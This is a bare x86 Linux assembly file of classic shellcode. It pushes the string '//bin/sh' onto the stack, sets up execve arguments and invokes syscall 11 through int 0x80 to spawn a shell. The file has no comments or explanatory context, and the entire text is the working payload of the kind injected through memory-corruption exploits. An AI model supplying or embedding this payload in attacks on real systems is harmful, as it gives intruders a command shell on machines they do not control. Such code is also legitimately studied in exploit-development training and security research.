global _start
section .text
_start:
xor edx,edx
xor ecx,ecx
mul ecx
push eax
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
push eax
push ebx
mov ecx, esp
mov al, 11
int 0x80
